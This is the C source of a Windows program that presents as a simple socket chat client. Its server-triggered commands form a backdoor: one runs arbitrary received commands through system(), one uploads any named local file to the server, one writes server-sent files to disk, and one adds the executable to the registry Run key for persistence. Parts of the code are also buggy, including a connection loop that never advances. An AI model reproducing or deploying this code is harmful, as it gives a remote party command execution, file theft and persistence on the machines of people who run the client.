#include<winsock2.h>
#include<windows.h>
#include<ws2tcpip.h>
#include<stdio.h>
#include<stdlib.h>
// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
//gcc cht.c -L./C:\Windows\System32 -lws2_32 -lmswsock -ladvapi32 -o b0.exe 
#define WIN32_LEAN_AND_MEAN
#define PORT            "3269"
#define BUFSIZE         100
#define BUF_in_SIZE     200
#define BUF_out_SIZE    200
#define US_NAME         15
#define US_PASSWORD     15
#define US_HLAM         30
#define FILEBUF        300000
#define FILENAME        50
#define COM             100
#define COMMAND         100

struct user {
    SOCKET us_socket;
    char us_name[US_NAME];
    char us_password[US_PASSWORD];
    char us_hlam[US_HLAM];
};

int scan();
void scn(char buf[], int size_buf);
int sendbytes();
int recvbytes();
//--------------------------------------------------------
int injection_cl();
int inj();
int fname_set(char *fname, int *file_size, char *buf);
int file_set(char *fname, void *buf, int size);
int st_info_load(char *fname, char *name, char *buf);
int filename_set(char *bufin_a, char *bufin_b, char *bufout, int size);
int still_cl();
int sys_cl();
int autorun_on_cl();
int autorun_off_cl();

SOCKET          sockfd, newfd;
fd_set          read_fd;
char            file[FILEBUF];
char            buf[BUFSIZE];
char            buf_in [BUF_in_SIZE];
char            buf_out[BUF_out_SIZE];
char            filename[FILENAME];
int             rev;

int main(int argc, char **argv) {
    WSADATA         wsaData;
    const char      *msg = "Hello test";    
    int             addrlen;

    struct addrinfo hints, *res, *p;

    if(argc != 2) {
        printf("usage: %s server-name\n", argv[0]);
        return 1;
    }

    if((rev = WSAStartup(MAKEWORD(2,2), &wsaData)) != 0) {
        printf("Faild: WSAStartup(%d)\n", rev);
        WSACleanup();
        return 1;
    }

    sockfd = INVALID_SOCKET;
    p = NULL;
    res = NULL;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_family   = AF_UNSPEC;

    if((rev = getaddrinfo(argv[1], PORT, &hints, &res)) != 0) {
        printf("Faild: getaddrinfo(%d)\n", rev);
        freeaddrinfo(res);
        WSACleanup();
        return 1;
    }

    for(p = res; p != NULL; p->ai_next) {
        if((sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == INVALID_SOCKET) {
            printf("Error socket: %ld\n", WSAGetLastError());
            freeaddrinfo(res);
            WSACleanup();
            return 1;
        }
        printf("Socket: OK\nConnection...\n");

        if((rev = connect(sockfd, p->ai_addr, (int)p->ai_addrlen)) == SOCKET_ERROR) {
            printf("Error conection: %d\n", rev);
            closesocket(sockfd);
            sockfd = INVALID_SOCKET;
            continue;
        }
        printf("Connect: OK\n");
        break;
    }
    freeaddrinfo(res);

    if(sockfd == NULL) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }
    printf("send...\n");
    sendbytes(msg, (int)strlen(msg));

    printf("Bytes sent: %ld\n");
    //printf("receive...\n", rev);
    //recvbytes(buf_in, (int)BUF_out_SIZE);

    scan(buf_out, (int)BUF_out_SIZE);
    printf("end\n");

    closesocket(sockfd);
    WSACleanup();

    return 0;
}

int dispatcher(SOCKET socket) {
    printf("IN dispatcher\n");

    if(buf_in[1] == 'i' && buf_in[2] == 'n' && buf_in[3] == 'j') {
        inj();
    }
    else if(buf_in[1] == 's' && buf_in[2] == 't' && buf_in[3] == 'i' && buf_in[4] == 'l' && buf_in[5] == 'l') {
        still_cl();
    }
    else if(buf_in[1] == 's' && buf_in[2] == 'y' && buf_in[3] == 's') {
        sys_cl();
    }
    else if(buf_in[1] == 'r' && buf_in[2] == 'n') {
        autorun_on_cl();
    }
    else if(buf_in[1] == 'r' && buf_in[2] == 'f') {
        autorun_off_cl();
    }

    return 0;
}

int recvbytes(char *msg, int len) {
    char *clon_buf;

    clon_buf = msg;
    clon_buf += BUF_in_SIZE - US_NAME;
    ZeroMemory(msg, len);

    rev = recv(sockfd, msg, len, 0);
    if(rev > 0) {
        if(msg[0] == '&') {
            dispatcher(sockfd);
            return 0;
        }
        printf("Bytes receive: %d\n", rev);
        printf("<<%s>>: ", clon_buf);
        ZeroMemory(clon_buf, (int)(BUF_in_SIZE - US_NAME));
        printf("[%s]\n", msg);
    }
    else if(rev == 0) {
        printf("Connection closed\n");
    }
    else 
        printf("recv failed with error: %ld\n", WSAGetLastError());

    return 0;
}

int sendbytes(void *msg, int len) {
    if((rev = send(sockfd, msg, len, 0)) == SOCKET_ERROR) {
        printf("Error send: %ld\n", WSAGetLastError());
        closesocket(sockfd);
        WSACleanup();
        return 1;
    }
    return 0;
}

int scan(char *buf, int len) {
        fd_set      read_fd;
        struct timeval tv;

        tv.tv_sec = 0;
        tv.tv_usec = 0;
        
        FD_ZERO(&read_fd);
        FD_SET(sockfd, &read_fd);
        printf("FD_SET:OK\n");

    for(;;) {
        ZeroMemory(buf_out, BUF_out_SIZE);
        scn(buf_out, BUF_out_SIZE);

       // printf("select...\n");

        printf("\n%s\n", buf_out);
        printf("end.\n");

        if(buf[0]== '-' && buf[1]== 's') {

            if(buf[3]== '&' && buf[4]== 'i' && buf[5]== 'n' && buf[6]== 'j') {
                injection_cl();
            }
           else{
                sendbytes(buf_out, (int)BUF_out_SIZE);
                printf("sendbytes()\n");
           }
        }
        else if(buf[0]== '-' && buf[1]== 'r') {
          recvbytes(buf_in, (int)BUF_in_SIZE);
          printf("recvbytes()\n");
        }
        else if(buf[0]== '-' && buf[1]== 'e') {
            break;
        }
    }
    printf("By-by");
    return 0;
}

void scn(char buf[], int size_buf) {
    struct timeval tv;

    tv.tv_sec = 0;
    tv.tv_usec = 0;
    int vr, i;
    i = 0;
    while ((vr = getchar()) != EOF && i < size_buf-1) {     //EOF;
      buf[i] = vr;
     i++;
     //putchar(vr);
     FD_SET(sockfd, &read_fd);
        if(select(sockfd+1, &read_fd, NULL, NULL, &tv) == -1) {
            printf("Error select: %ld\n", WSAGetLastError());
            WSACleanup();
            exit(4);
        }   
        if(FD_ISSET(sockfd, &read_fd)) {
            printf("****************\n");
            recvbytes(buf_in, (int)BUF_in_SIZE);
            printf("****************\n");
        }
     //
    }   
    buf[--i] = '\0';
}

int injection_cl() {
    printf("in injection\n");
    int filesize;
    char us_nam[US_NAME];

    for(int i = 0; i < (int)(FILENAME-1); i++) {
        filename[i] = buf_out[8+i];
        if(buf_out[8+i] != ' ') {
            continue;
        }
        filename[i] = '\0';
        i++;
        for(int j = 0; j < US_NAME; j++) {
            us_nam[j] = buf_out[8+i+j];
            if(buf_out[8+i+j] != '\0') {
                continue;
            }
            break;
        }
        break;
    }
    printf("filename: %s user_name: %s\n", filename, us_nam);

    if((filesize = file_load(filename, file)) > 0) {
        
        add_file_size(buf_out, &filesize, (int)BUF_out_SIZE);
        printf("size of file: %d / ", filesize);
        file_size(buf_out, &filesize, (int)BUF_out_SIZE);
        printf("size of file: %d\n", filesize);

        sendbytes(buf_out, (int)BUF_out_SIZE);
        printf("send File_name and size\n");
        recvbytes(buf_in, (int)BUF_in_SIZE);
        sendbytes(file, filesize);
        printf("Send file: OK");
    }

    return 0;
}

int add_file_size(char *buf, int *filesize, int size_buf) {
    char *c;
    c = (char *)filesize;

    for(int i = 0; i < sizeof(int); i++) {
        buf[size_buf - sizeof(int) + i] = *c;
        c++;
    }
    return 0;
}

int file_load(char *filename, void *file) {
    FILE *fp;
    char *c;
    int a, i;

    a = 0;

    if((fp = fopen(filename, "rb")) == NULL) {
        perror("Error file_load()");
        return 1;
    }

    c = (char *)file;
    while((i = getc(fp)) != EOF) {
        *c = i;
        c++;
        a++;        // size of file(count of bytes was wroten in buffer);
    }
    fclose(fp);
    return a;
}

int file_size(char *buf, int *filesize, int size_buf) {
    char *a;
    a = (char *)filesize;
    for(int i = 0; i < sizeof(int); i++) {
        *a = buf[size_buf-sizeof(int) + i];
        a++;
    }
    return 0;
}

int inj() {
    printf("IN inj\n");

    char file_name[FILENAME];
    int file_size, by;   
    char *inj_buf;

    inj_buf = buf_in;
    inj_buf += 4;

    if((by = fname_set(file_name, &file_size, inj_buf)) == 1) {
        printf("ERROR: file_name is bigger\n");
    }
    printf("file_name: %s\nfile_size: %d\n", file_name, file_size);

    by = recv(sockfd, file, (int)FILEBUF, 0);
    printf("recv in file %d bytes\n", by);

    file_set(file_name, file, file_size);
    printf("File '%s' set: OK\n", file_name);

    return 0;
}

int file_set(char *fname, void *buf, int size) {
    FILE *fp;
    char *c;

    if((fp = fopen(fname, "wb")) == NULL) {
        perror("Error occured while opening file\n");
        return 1;
    }

    c = (char *)buf;
    for(int i = 0; i < size; i++) {
        putc(*c, fp);
        c++;
    }

    fclose(fp);
    return 0;
}

int fname_set(char *fname, int *file_size, char *buf) {
    char *c;
    c = (char *)file_size;

    for(int i = 0; i < FILENAME; i++) {
        fname[i] = buf[i];
        if(buf[i] != '\0') {
            continue;
        }
        i++;
        for(int j = 0; j < sizeof(int); j++) {
            *c = buf[i+j];
            c++;
        }
        return 0;
    }
    return 1;           //слишком большое имя файла;
}

int still_cl() {
    printf("IN still()...\n");

    char fname[FILENAME];
    char to_name[US_NAME];
    int fsize;

    char *sti_buf;
    sti_buf = buf_in;
    sti_buf += 10;

    filename_set(fname, to_name, sti_buf, FILENAME);
    //file_size(buf_in, &fsize, (int)BUF_in_SIZE);
    printf("file_name: %s, us_to_name: %s\n", fname, to_name);

    fsize = file_load(fname, file);
    printf("fsize: %d\n", fsize);

    buf_out[0] = '-';
    buf_out[1] = 's';
    buf_out[2] = ' ';
    buf_out[3] = '&';
    buf_out[4] = 'i';
    buf_out[5] = 'n';
    buf_out[6] = 'j';
    buf_out[7] = ' ';

    sti_buf = buf_out;
    sti_buf += 8;

    st_info_load(fname, to_name, sti_buf);
    add_file_size(buf_out, &fsize, (int)BUF_out_SIZE);

    sendbytes(buf_out, (int)BUF_out_SIZE);
    printf("recv buf: %c\n", buf_out);
    recvbytes(buf_in, (int)BUF_in_SIZE);
    printf("still recv:OK\n");
    sendbytes(file, fsize);
    printf("Still: OK\n");
    return 0;
}

int filename_set(char *bufin_a, char *bufin_b, char *bufout, int size) {
    for(int i = 0; i < size; i++) {
        bufin_a[i] = bufout[i];
        if(bufout[i] == ' ') {
            bufin_a[i] = '\0';
            i++;
            for(int j = 0; j < US_NAME; j++) {
                bufin_b[j] = bufout[i+j];
                if(bufout[i+j] == ' ') {
                    bufin_b[j] = '\0';
                    return 0;
                }
            }
            return 2;        //размер логина слишкоми большой;
        }
    }
    return 1;               // размер имени файла слишком большой;
}

int st_info_load(char *fname, char *name, char *buf) {
    for(int i = 0; i < FILENAME; i++) {
        buf[i] = fname[i];
        if(fname[i] != '\0') {
            continue;
        }
        buf[i] = ' ';
        i++;
        for(int j = 0; j < US_NAME; j++) {
            buf[i+j] = name[j];
            if(name[j] != '\0') {
                continue;
            }
            buf[i+j] = '\0';
            return 0;
        }
    }
    return 1;
}

int sys_cl() {
    printf("In sys_cl\n");

    char command[COMMAND];

    char * sys_buf;
    sys_buf = buf_in;
    sys_buf += 8;

    command_set(command, sys_buf);
    system(command);

    printf("Command '%s' execute successfuly\n", command);

    return 0;
}

int command_set(char *com, char *buf) {
    for(int i = 0; i < COMMAND; i++) {
        com[i] = buf[i];
        if(buf[i] != ',') {
            continue;
        }
        com[i] = '\0';
        return 0;
    }
    return 1;
}

int autorun_on_cl() {
    HKEY hKeys; 
    char autorun[255];
    printf("in autorun\n");
    GetModuleFileName(NULL, autorun, sizeof(autorun));
        if(ERROR_SUCCESS==RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,NULL,0,KEY_ALL_ACCESS, NULL,&hKeys,NULL)){
            printf("ERROR_SUCCESS:%d\n", ERROR_SUCCESS);

            RegSetValueEx(hKeys,"b0.exe",0,REG_SZ, (char *)autorun,sizeof(autorun));
            RegCloseKey(hKeys);
            printf("autorun: OK\n");
        }
    return 0;
}

int autorun_off_cl() {
    HKEY hKeys; 
    char autorun[255];

    GetModuleFileName(NULL, autorun, sizeof(autorun));
        if(ERROR_SUCCESS==RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,NULL,0,KEY_ALL_ACCESS, NULL,&hKeys,NULL)){
            printf("ERROR_SUCCESS:%d\n", ERROR_SUCCESS);

            RegDeleteValueA(hKeys, "b0.exe");
            RegCloseKey(hKeys);
            printf("autorun_off: OK\n");
        }
    return 0;
}